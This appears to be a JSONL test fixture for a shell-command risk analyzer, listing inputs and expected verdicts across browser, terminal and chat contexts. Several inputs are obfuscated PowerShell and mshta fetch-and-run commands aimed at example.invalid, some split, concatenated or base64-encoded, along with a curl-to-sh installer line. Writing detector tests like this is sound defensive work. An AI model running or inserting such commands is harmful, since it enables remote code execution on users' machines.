{"id": "command.1b.ctx.none-browser-001", "area": "command", "op": "command.analyze_in", "source": "new", "input": "hello world", "args": {"context": {"source": "browser"}}, "expect": {"level": "none", "risk_score": 0, "trace_empty": true}}
{"id": "command.1b.ctx.malicious-001", "area": "command", "op": "command.analyze_in", "source": "new", "input": {"parts": ["power", "shell -w hid", "den -c \"i", "ex(i", "wr ht", "tps://example.invalid/a)\""]}, "expect": {"level": "malicious", "risk_score_min": 60, "hosts": ["example.invalid"]}}
{"id": "command.1b.ctx.malicious-terminal-001", "area": "command", "op": "command.analyze_in", "source": "new", "input": {"parts": ["power", "shell -w hid", "den -c \"i", "ex(i", "wr ht", "tps://example.invalid/a)\""]}, "args": {"context": {"source": "terminal"}}, "expect": {"level": "malicious", "risk_score_min": 60}, "note": "P1: a terminal source never lowers a Malicious verdict or its score band"}
{"id": "command.1b.ctx.malicious-browser-001", "area": "command", "op": "command.analyze_in", "source": "new", "input": {"parts": ["power", "shell -w hid", "den -c \"i", "ex(i", "wr ht", "tps://example.invalid/a)\""]}, "args": {"context": {"source": "browser"}}, "expect": {"level": "malicious", "risk_score_min": 70}}
{"id": "command.1b.ctx.installer-terminal-001", "area": "command", "op": "command.analyze_in", "source": "new", "input": {"parts": ["cu", "rl -LsSf ht", "tps://astral.sh/uv/install.sh | sh"]}, "args": {"context": {"source": "terminal"}}, "expect": {"level": "suspicious", "risk_score": 20}, "tags": ["installer"]}
{"id": "command.1b.ctx.installer-browser-001", "area": "command", "op": "command.analyze_in", "source": "new", "input": {"parts": ["cu", "rl -LsSf ht", "tps://astral.sh/uv/install.sh | sh"]}, "args": {"context": {"source": "browser"}}, "expect": {"level": "suspicious", "risk_score_min": 40, "hosts": ["astral.sh"]}, "tags": ["installer"]}
{"id": "command.1b.ctx.trace-001", "area": "command", "op": "command.analyze_in", "source": "new", "input": {"parts": ["& ('ms'+'hta') ht", "tps://example.invalid/a.hta"]}, "args": {"context": {"source": "browser"}}, "expect": {"level": "malicious", "trace_kinds_include": ["concat", "unwrap"], "hosts": ["example.invalid"], "risk_score_min": 70}}
{"id": "command.1b.ctx.trace-002", "area": "command", "op": "command.analyze_in", "source": "new", "input": {"parts": ["power", "shell -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwB4ACAAfAAgAGkAZQB4AA=="]}, "expect": {"level": "malicious", "trace_kinds": ["encoded_command"], "hosts_include": ["example.invalid"]}}
{"id": "command.1b.ctx.trace-003", "area": "command", "op": "command.analyze_in", "source": "new", "input": {"parts": ["i", "ex ([Text.Encoding]::UTF8.GetString([Convert]::FromBas", "e64String('aXdyIGh0dHBzOi8vZXhhbXBsZS5pbnZhbGlkL2I=')))"]}, "args": {"context": {"source": "chat"}}, "expect": {"level": "malicious", "trace_kinds_include": ["base64"], "hosts": ["example.invalid"]}}
{"id": "command.1b.ctx.obfuscated-none-001", "area": "command", "op": "command.analyze_in", "source": "new", "input": "'a'+'b'", "expect": {"level": "none", "risk_score": 4, "trace_kinds": ["concat"]}, "note": "obfuscation alone stays None; the score reflects it within the None band"}
